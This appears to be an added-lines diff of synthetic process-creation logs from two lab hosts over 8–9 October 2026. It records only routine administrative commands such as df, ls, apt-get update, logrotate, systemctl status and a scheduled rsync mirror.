+2026-10-08T09:35:10.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,40085,L-00155
+2026-10-08T09:50:39.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,34502,L-00156
+2026-10-08T09:58:33.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,45470,L-00157
+2026-10-08T10:12:23.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,1917,L-00158
+2026-10-08T10:13:24.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,30624,L-00159
+2026-10-08T10:19:16.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,3320,L-00160
+2026-10-08T11:27:32.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,8908,L-00161
+2026-10-08T11:36:04.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,9694,L-00162
+2026-10-08T11:42:40.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,26075,L-00163
+2026-10-08T12:11:16.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,54308,L-00164
+2026-10-08T12:35:01.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,48912,L-00165
+2026-10-08T12:40:30.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,36518,L-00166
+2026-10-08T13:10:03.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,13322,L-00167
+2026-10-08T13:23:56.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,55221,L-00168
+2026-10-08T13:48:30.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,36706,L-00169
+2026-10-08T14:20:47.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,51221,L-00170
+2026-10-08T14:50:19.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,17327,L-00171
+2026-10-08T15:27:26.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,22928,L-00172
+2026-10-08T15:34:13.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,51454,L-00173
+2026-10-08T15:44:41.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,21186,L-00174
+2026-10-08T15:58:04.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,23172,L-00175
+2026-10-08T16:16:06.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,42641,L-00176
+2026-10-08T16:18:02.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,20260,L-00177
+2026-10-08T16:43:07.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,44290,L-00178
+2026-10-08T16:45:23.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,35514,L-00179
+2026-10-08T17:12:25.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,19830,L-00180
+2026-10-08T17:42:08.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,22320,L-00181
+2026-10-08T17:46:05.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,45393,L-00182
+2026-10-08T18:45:10.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,46220,L-00183
+2026-10-08T20:09:55.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,28504,L-00184
+2026-10-08T22:02:53.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,12816,L-00185
+2026-10-08T22:20:17.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,3247,L-00186
+2026-10-08T22:21:50.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,27018,L-00187
+2026-10-08T22:37:16.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,34644,L-00188
+2026-10-09T01:01:04.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,55790,L-00189
+2026-10-09T01:28:56.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,4951,L-00190
+2026-10-09T07:43:07.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,56002,L-00191
+2026-10-09T08:28:28.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,17070,L-00192
+2026-10-09T08:45:54.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,22092,L-00193
+2026-10-09T09:04:05.000Z,lnx-nas-01.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,22273,L-00194
+2026-10-09T09:26:06.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,21735,L-00195
+2026-10-09T09:43:00.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,23288,L-00196
+2026-10-09T09:46:08.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,4949,L-00197
+2026-10-09T10:11:08.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,44338,L-00198
+2026-10-09T10:20:57.000Z,lnx-web-02.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,30082,L-00199
+2026-10-09T10:39:03.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,54122,L-00200
+2026-10-09T11:03:48.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,53026,L-00201
+2026-10-09T11:17:06.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,19375,L-00202
+2026-10-09T11:32:49.000Z,lnx-nas-01.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,31990,L-00203
+2026-10-09T11:45:23.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,12378,L-00204
+2026-10-09T12:28:43.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,52058,L-00205
+2026-10-09T12:29:20.000Z,lnx-web-02.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,16773,L-00206
+2026-10-09T12:56:24.000Z,lnx-nas-01.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,33991,L-00207
+2026-10-09T12:57:22.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,36045,L-00208
+2026-10-09T12:57:40.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,45454,L-00209
+2026-10-09T13:55:21.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,49530,L-00210
+2026-10-09T14:04:21.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,9455,L-00211
+2026-10-09T14:27:57.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,34345,L-00212
+2026-10-09T15:08:12.000Z,lnx-nas-01.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,12180,L-00213
+2026-10-09T15:20:45.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,17882,L-00214
+2026-10-09T15:58:40.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,50341,L-00215
+2026-10-09T16:14:52.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,35797,L-00216
+2026-10-09T16:51:27.000Z,lnx-nas-01.lab.example,ProcessCreated,ls,/usr/bin/ls,ls -la /volume1/backups,admin_rgomez,bash,/usr/bin/bash,7111,L-00217
+2026-10-09T16:54:21.000Z,lnx-web-02.lab.example,ProcessCreated,systemctl,/usr/bin/systemctl,systemctl status nginx,admin_rgomez,bash,/usr/bin/bash,1523,L-00218
+2026-10-09T17:06:10.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,57896,L-00219
+2026-10-09T17:26:08.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,16108,L-00220
+2026-10-09T17:48:51.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,45920,L-00221
+2026-10-09T18:07:21.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,40125,L-00222
+2026-10-09T18:18:24.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,9483,L-00223
+2026-10-09T19:03:39.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,10497,L-00224
+2026-10-09T19:26:07.000Z,lnx-web-02.lab.example,ProcessCreated,logrotate,/usr/sbin/logrotate,/usr/sbin/logrotate /etc/logrotate.conf,root,cron,/usr/sbin/cron,38546,L-00225
+2026-10-09T20:35:59.000Z,lnx-web-02.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,19432,L-00226
+2026-10-09T21:38:06.000Z,lnx-web-02.lab.example,ProcessCreated,bash,/usr/bin/bash,-bash,admin_rgomez,sshd,/usr/sbin/sshd,14434,L-00227
+2026-10-09T22:21:24.000Z,lnx-nas-01.lab.example,ProcessCreated,apt-get,/usr/bin/apt-get,apt-get -qq update,root,bash,/usr/bin/bash,1404,L-00228
+2026-10-09T23:03:12.000Z,lnx-nas-01.lab.example,ProcessCreated,rsync,/usr/bin/rsync,rsync -a --delete /volume1/exports/ /volume2/mirror/,root,cron,/usr/sbin/cron,7574,L-00229
+2026-10-09T23:50:00.000Z,lnx-web-02.lab.example,ProcessCreated,df,/usr/bin/df,df -h,admin_rgomez,bash,/usr/bin/bash,19398,L-00230
